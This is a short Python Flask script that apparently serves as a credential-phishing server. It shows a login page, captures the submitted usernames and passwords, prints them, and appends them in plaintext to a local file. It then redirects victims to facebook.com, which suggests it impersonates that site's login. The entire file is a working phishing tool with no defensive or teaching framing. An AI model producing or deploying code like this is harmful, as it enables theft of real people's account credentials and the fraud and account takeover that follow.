import os
from flask import Flask, request, render_template, redirect

app = Flask(__name__)

# Get the current working directory to use as the base path
current_directory = os.path.dirname(os.path.abspath(__file__))  # This gets the path of the current directory
file_path = os.path.join(current_directory, "captured_data.txt")  # Create the absolute path for captured_data.txt

# Serve the login page
@app.route("/")
def login_page():
    return render_template("login.html")

# Capture form data and redirect
@app.route("/submit-data", methods=["POST"])
def capture_data():
    username = request.form.get("username")
    password = request.form.get("password")
    
    # Debugging: print the received data to the terminal
    print(f"Received data: Username: {username}, Password: {password}")
    
    try:
        # Open the file using the absolute path and append the data
        with open(file_path, "a") as file:
            file.write(f"Username: {username}, Password: {password}\n")
            print(f"Data written to {file_path}")  # Debugging message to confirm writing
    except Exception as e:
        print(f"Error writing to file: {e}")
    
    return redirect("https://www.facebook.com")

if __name__ == "__main__":
    app.run(debug=True)
